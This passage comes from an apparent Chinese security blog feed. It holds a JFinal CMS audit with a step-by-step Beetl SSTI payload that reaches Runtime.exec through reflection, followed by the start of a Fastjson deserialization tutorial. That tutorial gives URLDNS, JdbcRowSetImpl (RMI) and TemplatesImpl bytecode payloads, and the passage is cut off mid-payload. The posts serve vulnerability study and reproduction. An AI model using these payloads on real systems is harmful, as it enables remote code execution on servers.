class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword)) &#123; <span class="comment">// 输入密码并且一直</span></span><br><span class="line">model.set(<span class="string">"password"</span>, JFlyFoxUtils.passwordEncrypt(newPassword));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(model.getStr(<span class="string">"email"</span>)) &amp;&amp; model.getStr(<span class="string">"email"</span>).indexOf(<span class="string">"@"</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"email格式错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>&emsp;&emsp; <code>model.update();</code>方法是更新数据，将信息写入数据库。具体实习方法可以下一部分代码。<br><img src="https://img-blog.csdnimg.cn/20200412175111793.png" alt="在这里插入图片描述"></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">model.update();</span><br><span class="line">UserCache.init(); <span class="comment">// 设置缓存</span></span><br><span class="line">SysUser newUser = SysUser.dao.findById(userid);</span><br><span class="line">setSessionUser(newUser); <span class="comment">// 设置session</span></span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">1</span>);<span class="comment">// 成功</span></span><br><span class="line"></span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>&emsp;&emsp; 首先方法会进行一个判断，然后创建一个sql语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">filter(FILTER_BY_UPDATE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_getModifyFlag().isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table table = _getTable();</span><br><span class="line">String[] pKeys = table.getPrimaryKey();</span><br><span class="line"><span class="keyword">for</span> (String pKey : pKeys) &#123;</span><br><span class="line">Object id = attrs.get(pKey);</span><br><span class="line"><span class="keyword">if</span> (id == <span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(<span class="string">"You can't update model without Primary Key, "</span> + pKey + <span class="string">" can not be null."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Config config = _getConfig();</span><br><span class="line">StringBuilder sql = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">List&lt;Object&gt; paras = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">config.dialect.forModelUpdate(table, attrs, _getModifyFlag(), sql, paras);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (paras.size() &lt;= <span class="number">1</span>) &#123;<span class="comment">// Needn't update</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 创建数据库连接，更新数据。    可以看到执行完这步就会更新数据库内容。（<code>利用MySQL语句监控，可以看到最下面的一条是执行的sql语句</code>）<br><img src="https://img-blog.csdnimg.cn/20200412175227291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200412175330982.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --------</span></span><br><span class="line">Connection conn = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">conn = config.getConnection();</span><br><span class="line"><span class="keyword">int</span> result = Db.update(config, conn, sql.toString(), paras.toArray());</span><br><span class="line"><span class="keyword">if</span> (result &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">_getModifyFlag().clear();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(e);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">config.close(conn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br></pre></td></tr></table></figure><hr><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol><li>我们可以看到整个数据更新的过程，我们没有看到任何的防护措施，过滤字符手段。</li></ol><hr><h1 id="SSTI模板注入漏洞"><a href="#SSTI模板注入漏洞" class="headerlink" title="SSTI模板注入漏洞"></a>SSTI模板注入漏洞</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; 感谢长亭科技大佬@Lilc耐心指导，这个漏洞也是这位大佬挖的，我只是漏洞复现并给大家分享一下笔者构造SSTI模板注入漏洞payload经验。</p><hr><p><img src="https://img-blog.csdnimg.cn/20200413194319697.gif" alt="在这里插入图片描述"><br>&emsp;&emsp; 漏洞存在的位置在管理员后台模板修改下，可以修改模板代码，插入恶意代码等操作。插入一段恶意代码可导致远程代码执行。</p><hr><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p><img src="https://img-blog.csdnimg.cn/20200414163051378.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200414163122383.png" alt="在这里插入图片描述"></p><hr><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>&emsp;&emsp; 点击保存页面的首先会进入到<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>然后判断请求方法，是POST方法会判断是upload还是saveFile，如果是saveFile方法会跳转到<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManager.java</code>中的saveFile方法。<br><img src="https://img-blog.csdnimg.cn/20200414163459783.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">saveFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        JSONObject array = <span class="keyword">new</span> JSONObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String content = <span class="keyword">this</span>.get.get(<span class="string">"content"</span>);</span><br><span class="line">            content = FileManagerUtils.decodeContent(content);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// before bakup</span></span><br><span class="line">            bakupFile(<span class="keyword">new</span> File(getRealFilePath()));</span><br><span class="line"></span><br><span class="line">            FileManagerUtils.writeString(getRealFilePath(), content);</span><br><span class="line">            array.put(<span class="string">"Path"</span>, <span class="keyword">this</span>.get.get(<span class="string">"path"</span>));</span><br><span class="line">            array.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">            array.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"JSONObject error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"JSONObject error"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"IOException error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"IOException error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 前期可以修改代码机制我们已经了解的很清楚了，没有做任何的防护措施。但这些远远达不到SSTI的要求。<code>判断一个系统或者CMS是否使用了任何一个模板引擎</code>，先有比较大众Java模板引擎有Velocity，Freemarker，而这款模板引擎是beetl，挖掘之间根本没有了解过。据查阅知道，这是一款国产的模板引擎。<a href="http://ibeetl.com/" target="_blank" rel="noopener">官方地址</a>，官网说有很多优势，感觉一般般，吹牛的水分比较大吧。在研究这个模板的时候，官方给<a href="http://ibeetl.com/guide/#/beetl/" target="_blank" rel="noopener">文档</a>真的很差，有些东西说的一知半解没有说清楚。<br><img src="https://img-blog.csdnimg.cn/20200414164508404.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200414165055321.png" alt="在这里插入图片描述"></p><hr><h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><p>&emsp;&emsp; 查阅官方文档，了解这款模板引擎调用Java方法和属性模式。<br><img src="https://img-blog.csdnimg.cn/20200414171840853.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 本文构造payload得有简单Java的反射机制基础。<a href="https://www.cnblogs.com/haha12/p/4724204.html" target="_blank" rel="noopener">推荐文章</a>，文章中用了一个简单案例再现了Java的反射。<a href="https://blog.csdn.net/SECURE2/article/details/81099574?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">推荐文章</a>,文章用很多解释是关于Java反射和类加载的知识内容。[新增]<a href="https://www.bilibili.com/video/BV1s4411U7x9?from=search&seid=13854513651556834308" target="_blank" rel="noopener">推荐视频</a><br>[video(video-hkteTk7M-1587384668444)(type-bilibili)(url-<a href="https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-【Java反射机制】不懂反射机制不配当java程序员?)]" target="_blank" rel="noopener">https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-【Java反射机制】不懂反射机制不配当java程序员?)]</a></p><h4 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h4><p>&emsp;&emsp; 这里笔者将payload拆解了，方便更好的解读一下payload。由于beetl模板引擎禁止了<code>java.lang.Runtime</code>和<code>java.lang.Process</code>，所以这里不能直接调用进程来达到远程代码执行的效果。这里采用Java反射机制来达到效果，当然也有其他的方法，比例写文件等。读者们可以自行尝试。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; <strong>先忽视上面的payload，下面会一步步解答，最后完整的payload</strong><br><img src="https://img-blog.csdnimg.cn/2020041418081219.png" alt="在这里插入图片描述"></p><ol><li>我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>的形式，然后payload就变成下面这样子了。<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>最终payload就变成了下面这样子。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 遇到使用了模板的解析CMS可以根据模板解析语言尝试执行命令，若遇到函数警用的情况可以尝试一些Bypass方法，比例一些反射、反序列化、字节码修改等。SSTI注入难的其实如何构造Payload，构造好了之后一切自然而然了。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7" target="_blank" rel="noopener">http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 学了一两个月的Java代码审计，对一些审计有了一定了解了。所以决定审计一下JavaWeb CMS，随便申请一下CV
      
    
    </summary>
    
    
    
      <category term="Java 文件上传" scheme="https://summersec.github.io/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习fastjson反序列化始</title>
    <link href="https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/"/>
    <id>https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/</id>
    <published>2020-07-23T00:22:16.000Z</published>
    <updated>2020-07-29T06:03:12.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; Fastjson这款国内知名的解析json的组件，笔者在此就不多介绍，网络上有很多分析学习fastjson反序列化漏洞文章。笔者在此以一种全新角度从分析payload构造角度出发，逆向学习分析fastjson反序列化漏洞始末。<br>ps：漏洞学习环境以代码均在上传<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">Github项目</a>。</p><hr><h1 id="初窥Payload"><a href="#初窥Payload" class="headerlink" title="初窥Payload"></a>初窥Payload</h1><p>&emsp;&emsp; 下面是一段最简单<code>Fastjson的版本号反序列化--URLDNS</code>代码，观察发现可以提出一个问题<code>@type</code>作用？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// dnslog平台网站：http://www.dnslog.cn/</span></span><br><span class="line">        String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">                <span class="string">":\"http://h2a6yj.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="type的作用"><a href="#type的作用" class="headerlink" title="@type的作用"></a>@type的作用</h2><p>&emsp;&emsp; 下面是一段实验代码，帮助理解分析<code>@type</code>的由来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"><span class="comment">//TODO 修改pom.xml中的fastjson &lt;= 1.2.24</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setName(<span class="string">"summer"</span>);</span><br><span class="line">        String str1 = JSONObject.toJSONString(user);</span><br><span class="line">        <span class="comment">// 转化的时候加入一个序列化的特征 写入类名</span></span><br><span class="line">        <span class="comment">// feature = 特征</span></span><br><span class="line">        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        <span class="comment">// str2输入结果会输出 @type+类名</span></span><br><span class="line">        <span class="comment">// 由此可知@type是用于解析JSON时的用于指定类</span></span><br><span class="line">        System.out.println(str1);</span><br><span class="line">        System.out.println(str2);</span><br><span class="line">        <span class="comment">//如果fastjson解析内容时没有配置，会默认使用缺省配置</span></span><br><span class="line">        <span class="comment">// TODO 查看parse方法 可以设置断点看看不同之处和相同之处</span></span><br><span class="line">        Object parse1 = JSON.parse(str1);</span><br><span class="line">        Object parse2 = JSON.parse(str2);</span><br><span class="line">        <span class="comment">//很明显的结果不一样</span></span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str1's parse1: "</span> + parse1);</span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str2's parse2: "</span> + parse2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142150824.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 对比分析一下，只要在JSON序列化的方法加入<code>SerializerFeature.WriteClassName</code>特征字段。序列化出来的结果会在开头加一个<code>@type</code>字段，值为进行序列化的类名。再将带有<code>@type</code>字段的序列化数据进行反序列化会得到对应的实例类对象。反序列化可以获取类对象？有Java基础的安全人应该会敏感的这里十之八九存在漏洞。<br>ps： 下面是一段验证代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Vuldemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"vul.fastjson.User\",\"age\":18,\"name\":\"summer\"&#125;"</span>;</span><br><span class="line">        Object ob = JSON.parse(payload);</span><br><span class="line">System.out.println(<span class="string">"反序列化后类对象:  "</span> + ob.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"反序列化结果: "</span> + ob);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142644574.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="RCE’s-payload"><a href="#RCE’s-payload" class="headerlink" title="RCE’s payload"></a>RCE’s payload</h2><p>&emsp;&emsp; 第一种payload是使用<code>com.sun.rowset.JdbcRowSetImpl</code>类，第二种是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。第二种之前在<a href="https://samny.blog.csdn.net/article/details/106160182" target="_blank" rel="noopener">漫谈Commons-Collections反序列化</a>讨论分析过，这里不再重复着重讨论分析第一种payload。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://127.0.0.1:1090/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAA